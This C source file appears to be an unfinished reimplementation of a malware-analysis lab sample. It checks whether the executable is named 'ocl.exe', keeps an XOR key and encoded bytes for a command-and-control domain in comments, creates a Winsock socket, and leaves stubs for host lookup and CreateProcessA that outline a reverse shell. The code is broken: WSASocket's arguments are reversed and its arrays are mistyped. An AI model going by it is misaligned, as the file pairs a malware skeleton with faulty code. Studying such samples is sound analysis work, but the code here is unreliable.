#include<stdio.h>
#include <string.h>
#include<Winsock2.h>
#pragma comment(lib,"ws2_32.lib")
int main(){
	//key in hex :31 71 61 7a 32 77 73 78 33 65 64 63 20
	//decode string in hex :46 06 16 54 42 05 12 1b 47 0c 07 02 5d 1c 00 16 45 16 01 1d 52 0b 05 0f 48 02 08 09 1c 15
	//both xored: 77 77 77 2e 70 72 61 63 74 69 63 61 6c 6d 61 6c 77 61 72 65 61 6e 61 6c 79 73 69 73 2e 63 6f 6d 
	// 1qaz2wsx3edc
	char *a[] = { '1','q','a','z','2','w','s','x','3','e','d','c','\0' };
	char *b[] = { 'o', 'c', 'l', '.', 'e', 'x', 'e', '\0' };
	
	char string1[13] ;
	char string2[8] ;
	
	for (int i = 0; i <13; i++)
	{
		string1[i] = a[i];
	}
	printf("%s\n",string1);
	for (int i = 0; i <8; i++)
	{
		string2[i] = b[i];
	}
	printf("%s\n", string2);
	char binaryPathName[270];
	GetModuleFileNameA(0, binaryPathName, 0x10E);
	printf("%s\n", binaryPathName);
	
	const char ch = '\\';
	char *ret;
	ret = strrchr(&binaryPathName, 0x5C);
	//printf("%s\n", ret);
	int size = strlen(ret);
	char newret[8];
	for (int i = 0; i < 8; i++)
	{
		//printf("%c", ret[i+1]);
		newret[i] = ret[i + 1];

	}
	int r;
	r = strcmp(newret, &string2);
	if (r == 0)
	{
		printf("the string are equal\n");
		WORD wVersionRequested;
		WSADATA WSAData;
		int err;
	
		err = WSAStartup(MAKEWORD(2, 2), &WSAData);
		if (err==0)
		{
			// make the socket
			SOCKET s;
			s = WSASocket(0, 0, NULL, IPPROTO_TCP, SOCK_STREAM, AF_INET);
			// do the xor

			//gethostbyname

			//STARTUPINFO
			

			//CreateProcessA
		}
	}
	
	system("pause");
	//decoading the 
}